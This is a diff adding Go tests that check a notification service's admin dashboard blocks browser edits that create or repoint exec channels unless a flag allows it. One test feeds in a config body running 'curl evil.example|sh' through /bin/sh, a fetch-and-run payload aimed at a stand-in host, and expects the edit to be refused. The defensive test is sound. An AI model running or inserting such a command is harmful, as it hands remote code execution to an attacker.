@@ -972,3 +972,134 @@ func TestDashboardIsNotCacheable(t *testing.T) {
 		t.Errorf("CSP = %q", csp)
 	}
 }
+
+// --- exec channels ------------------------------------------------------------
+//
+// An exec channel's settings name a command hubbub runs, so writing one from a
+// browser is choosing what code executes on the box — a different power from the
+// credential editing the dashboard exists for, resting on an identity that is a
+// proxy header. Off by default; these pin which edits the flag actually governs.
+
+// addExecChannel appends a hand-configured exec block, as an operator with SSH
+// would. /bin/true is real and absolute, so the file still loads.
+func addExecChannel(t *testing.T, chansPath string) {
+	t.Helper()
+	src := read(t, chansPath)
+	if err := os.WriteFile(chansPath, []byte(src+"\n[shell]\ntype = \"exec\"\ncommand = \"/bin/true\"\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+}
+
+func TestDashboardWillNotCreateAnExecChannel(t *testing.T) {
+	s, _, chansPath := adminServer(t)
+	before := read(t, chansPath)
+	_, c := etags(t, s)
+
+	rec := adminPost(t, s, "/admin/channels", adminEmail, url.Values{
+		"etag": {c}, "id": {"shell"}, "type": {"exec"},
+	})
+	if rec.Code == http.StatusOK {
+		t.Error("the dashboard created an exec channel with allow_exec_channels off")
+	}
+	if !strings.Contains(rec.Body.String(), "allow_exec_channels") {
+		t.Errorf("the refusal does not say how to allow it: %s", rec.Body.String())
+	}
+	if read(t, chansPath) != before {
+		t.Error("channels.toml changed despite a refused create")
+	}
+}
+
+// The settings editor replaces a block's whole body, so gating only the create
+// form would leave converting an existing channel wide open.
+func TestDashboardWillNotConvertAChannelIntoAnExec(t *testing.T) {
+	s, _, chansPath := adminServer(t)
+	before := read(t, chansPath)
+	_, c := etags(t, s)
+
+	rec := adminPost(t, s, "/admin/channels/ntfy/settings", adminEmail, url.Values{
+		"etag": {c}, "confirm": {"1"},
+		"body": {"type = \"exec\"\ncommand = \"/bin/sh\"\nargs = [\"-c\", \"curl evil.example|sh\"]\n"},
+	})
+	if rec.Code == http.StatusOK {
+		t.Error("an ntfy channel was rewritten into an exec one from the browser")
+	}
+	if read(t, chansPath) != before {
+		t.Error("channels.toml changed despite a refused edit")
+	}
+}
+
+// The other window: the block is already exec, so the type never changes and
+// only the command does.
+func TestDashboardWillNotRepointAnExecCommand(t *testing.T) {
+	s, _, chansPath := adminServer(t)
+	addExecChannel(t, chansPath)
+	before := read(t, chansPath)
+	_, c := etags(t, s)
+
+	rec := adminPost(t, s, "/admin/channels/shell/settings", adminEmail, url.Values{
+		"etag": {c}, "confirm": {"1"},
+		"body": {"type = \"exec\"\ncommand = \"/usr/bin/whoami\"\n"},
+	})
+	if rec.Code == http.StatusOK {
+		t.Error("an exec channel's command was repointed from the browser")
+	}
+	if read(t, chansPath) != before {
+		t.Error("channels.toml changed despite a refused edit")
+	}
+}
+
+func TestAllowExecChannelsOpensThoseEdits(t *testing.T) {
+	s, _, chansPath := adminServer(t)
+	s.Admin.AllowExec = true
+
+	_, c := etags(t, s)
+	rec := adminPost(t, s, "/admin/channels", adminEmail, url.Values{
+		"etag": {c}, "id": {"shell"}, "type": {"exec"},
+	})
+	if rec.Code != http.StatusOK {
+		t.Fatalf("create with the flag on: %d — %s", rec.Code, rec.Body.String())
+	}
+
+	_, c = etags(t, s)
+	rec = adminPost(t, s, "/admin/channels/shell/settings", adminEmail, url.Values{
+		"etag": {c}, "confirm": {"1"},
+		"body": {"type = \"exec\"\nenabled = false\ncommand = \"/bin/true\"\n"},
+	})
+	if rec.Code != http.StatusOK {
+		t.Fatalf("settings with the flag on: %d — %s", rec.Code, rec.Body.String())
+	}
+	if !strings.Contains(read(t, chansPath), "/bin/true") {
+		t.Error("the command was not written")
+	}
+}
+
+// The line the flag draws is "choosing what runs", not "touching an exec
+// channel at all". Pausing a misfiring one from the browser is worth keeping —
+// it acts on a command the operator already chose.
+func TestExecChannelCanStillBePausedWithoutTheFlag(t *testing.T) {
+	s, _, chansPath := adminServer(t)
+	addExecChannel(t, chansPath)
+	_, c := etags(t, s)
+
+	rec := adminPost(t, s, "/admin/channels/shell/toggle", adminEmail, url.Values{
+		"etag": {c}, "enable": {"0"},
+	})
+	if rec.Code != http.StatusOK {
+		t.Fatalf("pausing an exec channel was refused: %d — %s", rec.Code, rec.Body.String())
+	}
+	if !strings.Contains(read(t, chansPath), "enabled = false") {
+		t.Error("the channel was not parked")
+	}
+}
+
+// Cosmetic, but the form should not offer what the handler will refuse.
+func TestCreateFormOmitsExecWithoutTheFlag(t *testing.T) {
+	s, _, _ := adminServer(t)
+	if body := adminGet(t, s, "/admin", adminEmail).Body.String(); strings.Contains(body, `value="exec"`) {
+		t.Error("the create form offers exec while the flag is off")
+	}
+	s.Admin.AllowExec = true
+	if body := adminGet(t, s, "/admin", adminEmail).Body.String(); !strings.Contains(body, `value="exec"`) {
+		t.Error("the create form hides exec even with the flag on")
+	}
+}
